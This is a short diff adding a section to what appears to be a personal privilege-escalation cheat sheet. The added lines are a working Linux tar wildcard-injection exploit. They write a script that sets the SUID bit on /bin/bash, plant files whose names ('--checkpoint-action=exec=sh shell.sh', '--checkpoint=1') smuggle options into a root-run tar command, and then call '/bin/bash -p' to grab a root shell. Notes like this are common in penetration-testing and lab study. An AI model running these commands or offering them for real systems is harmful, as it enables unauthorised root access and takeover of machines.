@@ -346,7 +346,19 @@ powershell -c .\shell.exe
 
 ```
 
+# Bin Bash
 
+Single line commands
+```
+printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh 
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+```
+
+```
+"date" -show time
+"/bin/bash -p" -grab root
+```
 
 
 #win #priv
